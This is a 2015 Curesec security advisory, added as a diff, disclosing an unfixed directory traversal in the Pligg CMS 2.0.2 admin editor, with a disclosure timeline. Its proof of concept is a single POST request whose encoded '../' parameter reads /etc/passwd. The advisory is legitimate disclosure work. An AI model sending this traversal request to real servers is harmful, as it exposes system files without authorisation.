@@ -1,0 +1,46 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    Pligg CMS 2.0.2
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://pligg.com/
+Vulnerability Type:  Directory Traversal
+Remote Exploitable:  Yes
+Reported to vendor:  09/01/2015
+Disclosed to public: 10/07/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Vulnerability Description
+
+The editor delivered with Pligg CMS is vulnerable to directory traversal, which
+gives an attacker that obtained admin credentials the opportunity to view any
+file stored on the webserver that the webserver user has access to.
+
+Please note that admin credentials are required.
+
+3. Proof of Concept
+
+
+POST /pligg-cms-master/admin/admin_editor.php HTTP/1.1
+
+the_file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&open=Open
+
+4. Solution
+
+This issue was not fixed by the vendor.
+
+5. Report Timeline
+
+09/01/2015 Informed Vendor about Issue (no reply)
+09/22/2015 Reminded Vendor of disclosure date
+09/22/2015 Vendor replied, issue has been send to staff
+09/29/2015 Reminded Vendor of disclosure date (no reply)
+10/07/2015 Disclosed to public
+
+
+Blog Reference:
+http://blog.curesec.com/article/blog/Pligg-CMS-202-Directory-Traversal-81.html
